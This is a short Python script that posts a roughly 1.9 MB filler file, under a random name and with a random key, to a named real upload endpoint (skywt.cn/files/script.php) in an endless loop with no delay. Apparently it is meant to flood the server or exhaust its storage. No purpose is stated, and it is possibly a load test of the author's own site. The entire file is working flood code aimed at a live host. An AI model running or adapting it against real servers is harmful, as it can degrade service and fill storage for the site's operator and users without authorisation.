import requests
import string
import time
import random
import time


def gen(length: int):
    ret = ""
    for _ in range(length // 62 + 1):
        ret += string.digits + string.ascii_letters
    return ret[:length]


def gen_rand(length: int):
    ret = ""
    for _ in range(length//8):
        ret += ''.join(random.sample(string.digits + string.ascii_letters, 8))
    return ret


if __name__ == "__main__":
    random.seed(time.time_ns())
    file_data = gen(1919810)
    while (1):
        file_name = gen_rand(16)+".dat"
        data = {"time": "none", "key": gen_rand(16)}
        files = {"file": (file_name, file_data, "application/dat")}
        result = requests.post(
            url="https://skywt.cn/files/script.php", data=data, files=files)
        print(result.text)
